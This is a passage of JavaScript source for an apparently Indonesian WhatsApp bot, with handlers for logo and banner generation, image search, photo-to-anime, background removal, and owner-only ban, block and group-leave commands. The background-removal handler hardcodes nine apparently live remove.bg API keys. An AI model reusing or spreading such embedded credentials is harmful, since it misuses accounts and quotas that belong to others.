                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'banneroflol': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|banner\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|neeko`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|banner\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|neeko`)
                var memek = args.join(" ").split("|")
                var m1 = memek[0]
                var m2 = memek[1]
                var m3 = memek[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|banner\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|neeko`)
                const style = ['ahri-2', 'neeko', 'nocturne', 'shen-2', 'veigar', 'rakanayah-2', 'zoe-2', 'pantheon-2', 'rammus', 'udyr', 'darius-2', 'ekko-2', 'lablanc', 'leona', 'nissfotune', 'poppy', 'quinn', 'talon-2', 'akali-2', 'irelia-2', 'jinx-2', 'nordekaiser', 'pyke-2', 'renekton', 'rengar', 'sivir', 'sona', 'soraka', 'tristana', 'warwick', 'yuumi', 'ziggs', 'leesin', 'lulu', 'lux', 'naster-yi', 'norgana', 'nasus', 'pantheon', 'pyke', 'qiyana', 'rakan', 'rakanxayah', 'riven', 'shen', 'sylas', 'talon', 'teemo', 'thresh', 'tryndamere', 'varus', 'vayne', 'velkoz', 'vladimir', 'yasuo', 'zed', 'zoe', 'hecarim', 'heimerdinger', 'illaoi', 'irelia', 'ivern', 'janna', 'jarvan-iv', 'jax', 'jayce', 'jhin', 'jinx', 'kaisa', 'kalista', 'karma', 'karthus', 'kassadin', 'katarina', 'kayle', 'kayn', 'kennen', 'khazix', 'kindred', 'kled', 'kogmaw', 'aatrox', 'ahri', 'akali', 'alistar', 'amumu', 'anivia', 'annie', 'ashe', 'aurelionsol', 'azir', 'bard', 'blitzcrank', 'brand', 'braum', 'caitlyn', 'camille', 'cassiopeia', 'chogath', 'corki', 'darius', 'diana', 'drmundo', 'draven', 'ekko', 'elise', 'evelynn', 'ezreal', 'fiddlesticks', 'fiora', 'fizz', 'galio', 'gangplank', 'garen', 'gnar', 'gragas', 'graves']
                if (!style.includes(m3)) {
                    getStyle(style.length, "banner")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        banner: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'gmage':
            case 'image':
            case "img":
            case "iap":
            case 'gimage':
            case 'gambar':
            case 'carigambar': {
            if (isBan) return reply(mess.ban)
            if (!text) return m.reply( `Mᴀᴜ ᴄᴀʀɪ ᴀᴘᴀ ᴋᴀᴋ ?\n*Cᴏɴᴛᴏʜ : ${prefix + command} Bᴇɴᴅᴇʀᴀ Iɴᴅᴏɴᴇsɪᴀ*`)
             m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://api.lolhuman.xyz/api/gimage?apikey=${lolkeysapi}&query=${text}` }, caption: `*「 HASIL PENCARIAN 」*
               
*📸 Jᴜᴅᴜʟ* : ⟨ ${text} ⟩
*⚙️ Pᴇɴᴄᴀʀɪᴀɴ Bʏ :* Gᴏᴏɢʟᴇ & Yᴀɴᴅᴇx`}, { quoted: m } )
           }
            break
            case 'bannerofaov2': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|banner\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|ishar`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|banner\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|ishar`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|banner\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|ishar`)
                const style = ['airi-2', 'aleister', 'astrid-2', 'ata', 'butterfly-2', 'dirak', 'ignis-2', 'ishar', 'jinna', 'lauriel-3', 'nina-2', 'natalya-2', 'omen-2', 'qi-2', 'quillen3', 'raz', 'roxie-2', 'ryoma-2', 'taara-2', 'violet-3', 'wukong-4', 'wukong-3', 'krixi-2', 'krizziz', 'nurad-5', 'volkath', 'wisp-2', 'wukong-2', 'enzo-2', 'hayate-2', 'annette-2', 'capheny-2', 'celica', 'gildur-2', 'lauriel-2', 'nurad-4', 'quillen-2', 'sephera-2', 'qi', 'nurad-3', 'nurad-2', 'nakroth-2', 'zip', 'diao-chan-2', 'enzo', 'errol', 'joker', 'payna', 'slimz', 'thane', 'toro', 'veres', 'violet-2', 'wisp', 'yena', 'zill', 'arduin', 'arthur', 'batman', 'capheny', 'darcy', 'elsu', 'florentino', 'gildur', 'ignis', 'wukong', 'yena', 'zanis', 'violet', 'tulen', 'sephera', 'nurad', 'nina', 'lindis', 'liliana', 'lauriel', 'krixi', 'kahlii', 'hayate', 'diao-chan', 'butterfly', 'astrid', 'arum', 'annette', 'amily', 'airi', 'zuka', 'zephys', 'zanis', 'yorn', 'xeniel', 'veres', 'veera', 'tel-annas', 'taara', 'superman', 'skud', 'ryoma', 'roxie', 'quillen', 'omen', 'natalya', 'nakroth', 'lubu']
                if (!style.includes(m3)) {
                    getStyle(style.length, "banner")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        banner: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'bot': {
            if (isBan) return reply(mess.ban)
            m.reply(`Sᴜᴅᴀʜ Oɴ Kᴀᴋ ^~^\n\n*❑ Sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ  : ${prefix}ᴍᴇɴᴜ*\n◈ Uɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ғɪᴛᴜʀ ғɪᴛᴜʀ ʙᴏᴛ !`)
            }
            break
            case 'teamlogo': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|buffalo`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|buffalo`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|buffalo`)
                const style = ['cobra', 'dragon', 'eagle2', 'falcon', 'lion2', 'tiger2', 'bear', 'buffalo', 'eagle', 'lion', 'tiger', 'wolf']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'out':
            case 'lev': {
            if (isBan) return reply(mess.ban)
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.group)
                await tganz.groupLeave(m.chat).then((res) => m.reply(`Sᴀᴍᴘᴀɪ ᴊᴜᴍᴘᴀ ᴋᴀᴋᴀᴋ sᴇᴍᴜᴀ. Aᴋᴜ ᴀᴋᴀɴ sᴇʟᴀʟᴜ ᴍᴇʀɪɴᴅᴜᴋᴀɴ ᴋᴀʟɪᴀɴ 😘\n\n*⫹⫺ Jᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴏɪɴ ɢʀᴜᴘᴋᴜ ᴀɢᴀʀ ʙɪsᴀ ᴋᴇᴛᴇᴍᴜ ʟᴀɢɪ :*\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz`)).catch((err) => m.reply(`Pᴇɴɢᴇʟᴜᴀʀᴀɴ ʙᴏᴛ ᴅɪʙᴀᴛᴀʟᴋᴀɴ ᴋᴀʀᴇɴᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ !`))
          }
            break
            case 'banned':
            case 'ban': {
            if (isBan) return reply(mess.ban)
            if (!isCreator) return m.reply(mess.owner)
            if (!text) return m.reply(`Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*◈ Cᴏɴᴛᴏʜ : ${prefix}${command} 628xxxxxxxxx*`)
            if(isNaN(text)) return await m.reply('Nᴏᴍᴏʀ ʜᴀʀᴜs ʙᴇʀᴜᴘᴀ ᴀɴɢᴋᴀ ᴛɪᴅᴀᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ + ʟᴀɴɢsᴜɴɢ 62xxxxxx')
            prmin = args.join(" ")
            banned.push(`${prmin}@s.whatsapp.net`)
            fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
            m.reply(`╔═════════════════════❑\n╠☞ Nᴏᴍᴏʀ : wa.me/${prmin}\n╚═════════════════════❑\n\n════════⟨ *Tᴇʟᴀʜ Dɪ Bᴀɴɴᴇᴅ* ⟩════════\n*❑ Pᴇɴɢɢᴜɴᴀ ʏᴀɴɢ ᴅɪ ʙᴀɴɴᴇᴅ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ʙᴏᴛ ʟᴀɢɪ !!!*\n═════════════════════════`)
          }
            break
            case 'unban': {
            if (isBan) return reply(mess.ban)
           if (!isCreator) return m.reply(mess.owner)
           if (!text) return m.reply(`Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*◈ Cᴏɴᴛᴏʜ : ${prefix}${command} 628xxxxxxxxx*`)
           if(isNaN(text)) return await m.reply('Nᴏᴍᴏʀ ʜᴀʀᴜs ʙᴇʀᴜᴘᴀ ᴀɴɢᴋᴀ ᴛɪᴅᴀᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ + ʟᴀɴɢsᴜɴɢ 62xxxxxx')
            prmin = `${text}@s.whatsapp.net`
            anul = banned.indexOf(prmin)
            banned.splice(anul, 1)
            fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
            m.reply(`╔═════════════════════❑\n╠☞ Nᴏᴍᴏʀ : wa.me/${prmin}\n╚═════════════════════❑\n\n════════⟨ *Tᴇʟᴀʜ Dɪ Uɴʙᴀɴɴᴇᴅ* ⟩════════\n*❑ Pᴇɴɢɢᴜɴᴀ ʏᴀɴɢ ᴅɪ ᴜɴʙᴀɴɴᴇᴅ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ʙᴏᴛ ʟᴀɢɪ !!!*\n══════════════════════════`)
            }
              break
            case 'companylogo2': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                const style = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'rmbg': 
            case 'imagenobg': 
            case 'removebg': 
            case 'remove-bg': {
            if (isBan) return reply(mess.ban)
	    if (!isMedia) return reply(`Fᴏᴛᴏɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ⟨ Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ ⟩*`)
	    if (!/image/.test(mime)) return reply(`Fᴏᴛᴏɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ⟨ Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ ⟩*`)
	    if (/webp/.test(mime)) return reply(`Fᴏᴛᴏɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ⟨ Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ ⟩*`)
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await tganz.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    tganz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.done}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	      break
            case 'blokir':
            case 'blok':
            case 'block': {
            if (isBan) return reply(mess.ban)
            if (!isCreator) return m.reply(mess.owner)
            if (!text) return reply(`Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 628xxxxxxxx Aᴛᴀᴜ ᴛᴀɢ ᴍᴇᴍʙᴇʀ/ᴏʀᴀɴɢɴʏᴀ !*`)
            let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await tganz.updateBlockStatus(users, 'block').then((res) => reply('Pᴇᴍʙʟᴏᴋɪʀᴀɴ Sᴜᴋsᴇs !!!')).catch((err) => reply('Mᴀᴀғ ᴋᴀᴋ, Pᴇᴍʙʟᴏᴋɪʀᴀɴ ʙᴀᴛᴀʟ ᴋᴀʀᴇɴᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ !'))
	}
	break
	            case 'toanime': 
	            case 'jadianime':  {
            if (isBan) return reply(mess.ban)
              if (!isMedia) return reply(`◈ Fᴏᴛᴏɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} <Bᴀʟᴀs Gᴀᴍʙᴀʀ Wᴀᴊᴀʜ>*`)
              if (/webp/.test(mime)) return reply(`◈ Fᴏᴛᴏɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} <Bᴀʟᴀs Gᴀᴍʙᴀʀ Wᴀᴊᴀʜ>*`)
                m.reply(`_⌛ Tᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ ʏᴀ ᴋᴀᴋ..._\n\n❑ 𝗝𝗶𝗸𝗮 𝗴𝗮𝗺𝗯𝗮𝗿 𝗵𝗮𝘀𝗶𝗹 𝗷𝗮𝗱𝗶𝗮𝗻𝗶𝗺𝗲 𝗯𝗲𝗹𝘂𝗺 𝗱𝗶 𝗸𝗶𝗿𝗶𝗺, 𝗔𝗱𝗮 𝗸𝗲𝗺𝘂𝗻𝗴𝗸𝗶𝗻𝗮𝗻 𝗯𝗮𝗵𝘄𝗮 𝗳𝗼𝘁𝗼 𝘆𝗮𝗻𝗴 𝗸𝗮𝗸𝗮𝗸 𝗸𝗶𝗿𝗶𝗺/𝗯𝗮𝗹𝗮𝘀 𝘁𝗲𝗿𝗵𝗮𝗹𝗮𝗻𝗴 𝗳𝗶𝗹𝘁𝗲𝗿 𝗺𝗮𝘂𝗽𝘂𝗻 𝗲𝗺𝗼𝗷𝗶/𝗲𝗺𝗼𝘁. 𝗨𝘁𝗮𝗺𝗮𝗸𝗮𝗻 𝘁𝗶𝗱𝗮𝗸 𝗺𝗲𝗺𝗮𝗸𝗮𝗶 𝗳𝗶𝗹𝘁𝗲𝗿/𝗲𝗺𝗼𝘁 𝘆𝗮 𝗸𝗮𝗸 !!!`)
           const media23 = await tganz.downloadAndSaveMediaMessage(quoted)
           const anu = await TelegraPH(media23)
           let hasilanime = await fetchJson(`https://api.lolhuman.xyz/api/imagetoanime?apikey=${lolkeysapi}&img=${anu}`)
       // tganz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=${lolkeysapi}&img=${anu}` }, caption: mess.done }, { quoted: m})
	   		let proses = await remini(hasilanime, "enhance");
   			tganz.sendMessage(m.chat, { image: proses, caption: mess.done }, { quoted: m})
	  		await sleep(5000) // Semakin lama waktu yang di tunggu semakin baik hasilnya !!!
	     		}
             break
             case 'unblokir':
             case 'bukablokir':
             case 'unblok':
             case 'unblock': {
            if (isBan) return reply(mess.ban)
            if (!isCreator) return m.reply(mess.owner)
            if (!text) return reply(`Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 628xxxxxxxx Aᴛᴀᴜ ᴛᴀɢ ᴍᴇᴍʙᴇʀ/ᴏʀᴀɴɢɴʏᴀ !*`)
            let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await tganz.updateBlockStatus(users, 'unblock').then((res) => reply('Pᴇᴍʙᴜᴋᴀᴀɴ Bʟᴏᴋɪʀ Sᴜᴋsᴇs !!!')).catch((err) => reply('Mᴀᴀғ ᴋᴀᴋ, Pᴇᴍʙᴜᴋᴀᴀɴ ʙʟᴏᴋɪʀ ʙᴀᴛᴀʟ ᴋᴀʀᴇɴᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ !'))
}
	break
            case 'companylogo': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                const style = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'gradientlogo': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|3`)
                const style = ['1', '2', '3', '4', '5', '6']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'pencilsketch': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|icon\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|panda`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|icon\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|panda`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|icon\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|panda`)
                const style = ['bird', 'butterfly', 'coffee', 'dove', 'leaf', 'like', 'lotus', 'milk-tea', 'panda', 'tree', 'woman', 'bear', 'bull', 'dragon', 'eagle', 'hawk', 'ninja', 'paw', 'rooster', 'sabertooth', 'skull', 'warrior', 'zebra']
                if (!style.includes(m3)) {
                    getStyle(style.length, "icon")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        icon: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'gunlogogaming': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|m14ebr`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|m14ebr`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|m14ebr`)
                const style = ['ak47', 'ak47-s', 'an94', 'ar15', 'aug', 'awm', 'g36k', 'm4a1', 'm4-s', 'm14ebr', 'm16', 'm60', 'm82a1', 'mp5', 'scar', 'svd', 'xm8', 'xm1014']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
